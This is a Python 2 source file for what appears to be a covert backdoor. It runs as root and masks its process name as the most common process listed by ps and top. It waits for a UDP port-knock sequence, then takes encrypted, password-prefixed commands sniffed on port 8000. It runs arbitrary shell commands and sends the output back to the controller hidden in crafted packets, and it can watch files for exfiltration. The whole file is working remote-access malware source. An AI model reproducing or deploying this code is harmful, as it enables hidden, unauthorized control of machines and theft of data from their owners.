#!/usr/bin/python
import logging, setproctitle, triplesec, encryption, configfile, helpers, os, sys, multiprocessing
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from ctypes import cdll, byref, create_string_buffer
from watchdog.observers import Observer
from fileWatch import FileWatch

state = 0
observer = Observer()
watch= ''
# unauthClients = {}
# authedClients = {}

def checkRoot():
    if(os.getuid() != 0):
        sys.exit("This program must be run with root. Try Again..")

def setProcessName(name):
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(name) + 1)
    buff.value = name
    libc.prctl(15, byref(buff), 0, 0, 0)

def maskProcess():
    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    #print "Most common process for ps/htop: {0}".format(commandResult)
    setproctitle.setproctitle(commandResult)
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    setProcessName(commandResult)
    #print "Most common process for top: {0}".format(commandResult)

def knock(packet):
    global state
    knocks = configfile.knock
    if IP in packet:
        if UDP in packet:
            ip = packet[IP].src
            if packet[UDP].sport == knocks[0]  and state == 0:
                state = 1
                print packet[IP].src + " state 1"
            elif packet[UDP].sport == knocks[1] and state == 1:
                state = 2
                print packet[IP].src + " state 2"
            elif packet[UDP].sport == knocks[2] and state == 2:
                state = 3
                print packet[IP].src + " state 3"
            else:
                print "Wrong sequence, state = 0"

def shellCommand(packet, command):
    print "Running command " + command
    ip = packet[IP].src
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = output.stdout.read() + output.stderr.read()
    encryptedData = encryption.encrypt(output, configfile.masterkey)
    encryptedData = helpers.chunkString(2, encryptedData)
    lastIndex = len(encryptedData) - 1
    time.sleep(1)
    for index, chunk in enumerate(encryptedData):
        if len(chunk) == 2:
            pairs = list(chunk)
            packet = helpers.createPacketTwo(configfile.protocol, ip, pairs[0], pairs[1])
        elif len(chunk) == 1:
            packet = helpers.createPacketOne(configfile.protocol, ip, chunk)
        if index == lastIndex:
            packet = packet/Raw(load=configfile.password)
        send(packet)
        time.sleep(0.1)

def watchAdd(path, ip):
    watch = observer.schedule(FileWatch(ip,configfile.protocol, configfile.password, configfile.masterkey), path)
    observer.start()
    message = configfile.password + "Watch added"
    encrptedMessage = encryption.encrypt(message, configfile.masterkey)
    helpers.sendMessage(encrptedMessage
                       , configfile. password
                       , configfile.protocol
                       , ip
                       , 8000)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()

def watchRemove():
    observer.unschedule(watch)

def screenshot():
    print "screenshot"

def exit():
    print "exit"

def parseCommand(packet):
    if packet.haslayer(IP) and packet.haslayer(Raw):
        encryptedData = packet['Raw'].load
        data = encryption.decrypt(encryptedData, configfile.masterkey)
        if data.startswith(configfile.password):
            data = data[len(configfile.password):]
            commandType, commandString = data.split(' ', 1)
            if commandType == 'shell':
                shellCommand(packet, commandString)
            elif commandType == 'watchAdd':
                watchAdd(commandString, packet[IP].src)
            elif commandType == 'watchRemove':
                watchRemove()
            elif commandType == 'screenshot':
                screenshot()
            elif commandType == 'exit':
                exit()
            else:
                # terrible
                print "Unknown command"

def main():
    checkRoot()
    while state is not 3:
        sniff(filter='udp', prn=knock, count=1)
    while True:
        sniff(filter="dst port 8000", count=1, prn=parseCommand)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "exiting.."
